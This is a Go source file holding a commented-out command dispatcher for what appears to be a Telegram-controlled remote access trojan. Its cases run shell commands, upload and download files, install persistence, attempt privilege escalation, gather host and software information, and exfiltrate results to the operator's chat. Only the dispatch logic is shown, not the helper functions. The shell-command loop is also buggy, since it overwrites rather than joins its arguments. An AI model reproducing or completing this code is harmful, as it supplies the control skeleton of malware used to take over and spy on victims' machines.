package commands

// func CMDSwitch(command string, vars []string) {
// 	if util.Dbg {
// 		log.Println("Switch Recieved: " + command)
// 	}
// 	switch strings.ToLower(command) {
// 	case "help":
// 		Exfil(Help)
// 	case "ping":
// 		Ping()
// 	case "gryphon":
// 		if util.Dbg {
// 			log.Println(vars)
// 		}
// 		GSwitch(vars)
// 	case "evolve":
// 		wgg := &sync.WaitGroup{}
// 		wgg.Add(1)
// 		roots.Regrowth(vars[0], wgg)
// 		wgg.Wait()
// 	case "reset":
// 		api.NewGenesis()
// 	case "info":
// 		Exfil(Info())
// 	case "soft":
// 		Software()
// 	case "sh":
// 		var scmd string
// 		for _, s := range vars {
// 			scmd = s + " "
// 		}
// 		if util.Dbg {
// 			log.Println("Command: " + scmd)
// 		}
// 		Shell(scmd)
// 	case "up":
// 		UploadFile(vars[0])
// 	case "dl":
// 		Download(vars[0])
// 	case "persist":
// 		if !install.IsInstalled() {
// 			install.Install()
// 		}
// 	case "root":
// 		Elevate()
// 	case "inst":
// 		InstanceInfo()
// 	case "remove":
// 		d := install.Uninstall()
// 		b := make([]interface{}, len(d))
// 		for i := range d {
// 			b[i] = d[i]
// 		}
// 		resp := fmt.Sprintf(fmtUninstall, b...)
// 		log.Println(resp)
// 		msg := tgbotapi.NewMessage(util.ChatID, resp)
// 		msg.ParseMode = "Markdown"
// 		msg.Text = resp
// 		api.Bot.Send(msg)
// 		//Exfil(resp)
// 	default:
// 		Exfil("[<b>!</b>] Unknown Command...\n\n" + Help)
// 	}
// }
